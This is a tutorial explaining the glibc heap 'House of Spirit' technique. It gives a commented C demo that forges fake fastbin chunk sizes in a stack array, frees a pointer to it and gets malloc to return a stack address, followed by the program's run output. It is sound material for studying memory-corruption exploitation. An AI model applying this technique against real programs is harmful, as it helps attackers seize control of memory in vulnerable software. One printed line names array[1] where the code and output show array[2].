# House of Spirit Explanation

Shoutout to `fanpu` for a fix to a mistake for the diagram.

So this is a well documented C source file that explains how a House of Spirit attack works. It was ran on Ubuntu 16.04. Essentially with a House of Spirit attack, we create two fake chunks by writing two integers to a region of memory that will represent the sizes of the fake chunks. Then we get a pointer to point to the first fake chunk, and free it. Then we get malloc to return a pointer to that memory region. So it essentially allows us to get malloc to return a pointer to a region of memory that we can write two integers to.

It might seem a bit redundant since we can already write to this memory region. However if we can get malloc to return a pointer to a memory region, depending on the code we should be able to edit/view/manipulate that region of memory differently.

Here is the source code:
```
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	puts("So we will be covering a House of Spirit Attack.");
	puts("A House of Spirit Attack allows us to get malloc to return a fake chunk to a region we have some control over (such as the bss or stack).");
	puts("In order for this attack to work and pass all of the malloc checks, we will need to make two fake chunks.");
	puts("To setup the fake chunks, we will need to write fake size values for the chunks.");
	puts("Also the first fake chunk is where we will want our chunk returned by malloc to be.");
	puts("Let's get started!\n");


	unsigned long array[20];
	printf("So we start off by initializing our array on the stack.\n");
	printf("Array Start: %p\n", array);
	printf("Our goal will be to allocate a chunk at %p\n\n", &array[2]);


	printf("Now we need to write our two size values for the chunks.\n");
	printf("There are three restrictions we have to meet.\n\n");

	printf("0.) Size of the chunks must be within the fast bin range.\n");
	printf("1.) The size values must be placed where they should if they were an actual chunk.\n");
	printf("2.) The size of the first heap chunk (the one that gets freed and reallocated) must be the same as the rounded up heap size of the malloc that we want to allocate our fake chunk.\n");
	printf("That should be larger than the argument passed to malloc.\n\n");

	printf("Also as a side note, the two sizes don't have to be equal.\n");
	printf("Check the code comments for how the fake heap chunks are structured.\n");
	printf("With that, let's write our two size values.\n\n");

	/*
	this will be the structure of our two fake chunks:
	assuming that you compiled it for x64

	+-------+---------------------+------+
	| 0x00: | Chunk # 0 prev size | 0x00 |
	+-------+---------------------+------+
	| 0x08: | Chunk # 0 size      | 0x60 |
	+-------+---------------------+------+
	| 0x10: | Chunk # 0 content   | 0x00 |
	+-------+---------------------+------+
	| 0x60: | Chunk # 1 prev size | 0x00 |
	+-------+---------------------+------+
	| 0x68: | Chunk # 1 size      | 0x40 |
	+-------+---------------------+------+
	| 0x70: | Chunk # 1 content   | 0x00 |
	+-------+---------------------+------+

	for what we are doing the prev size values don't matter too much
	the important thing is the size values of the heap headers for our fake chunks
	*/

	array[1] = 0x60;
	array[13] = 0x40;

	printf("Now that we setup our fake chunks set up, we will now get a pointer to our first fake chunk.\n");
	printf("This will be the ptr that we get malloc to return for this attack\n");

	unsigned long *ptr;
	ptr = &(array[2]);

	printf("Address: %p\n\n", ptr);

	printf("Now we will free the pointer to place it into the fast bin.\n");

	free(ptr);

	printf("Now we can just allocate a chunk that it's rounded up malloc size will be equal to that of our fake chunk (0x60), and we should get malloc to return a pointer to array[1].\n\n");

	unsigned long *target;
	target = malloc(0x50);

	printf("returned pointer: %p\n", target);

}
```

When we run it:
```
$	./house_spirit_exp 
So we will be covering a House of Spirit Attack.
A House of Spirit Attack allows us to get malloc to return a fake chunk to a region we have some control over (such as the bss or stack).
In order for this attack to work and pass all of the malloc checks, we will need to make two fake chunks.
To setup the fake chunks, we will need to write fake size values for the chunks.
Also the first fake chunk is where we will want our chunk returned by malloc to be.
Let's get started!

So we start off by initializing our array on the stack.
Array Start: 0x7ffd2d2cbc10
Our goal will be to allocate a chunk at 0x7ffd2d2cbc20

Now we need to write our two size values for the chunks.
There are three restrictions we have to meet.

0.) Size of the chunks must be within the fastin range.
1.) The size values must be placed where they should if they were an actual chunk.
2.) The size of the first heap chunk (the one that gets freed and reallocated) must be the same as the rounded up heap size of the malloc that we want to allocate our fake chunk.
That should be larger than the argument passed to malloc.

Also as a sidenote, the two sizes don't have to be equal.
Check the code comments for how the fake heap chunks are structured.
With that, let's write our two size values.

Now that we setup our fake chunks set up, we will now get a pointer to our first fake chunk.
This will be the ptr that we get malloc to return for this attack
Address: 0x7ffd2d2cbc20

Now we will free the pointer to place it into the fast bin.
Now we can just allocate a chunk that it's rounded up malloc size will be equal to that of our fake chunk (0x60), and we should get malloc to return a pointer to array[1].

returned pointer: 0x7ffd2d2cbc20
```

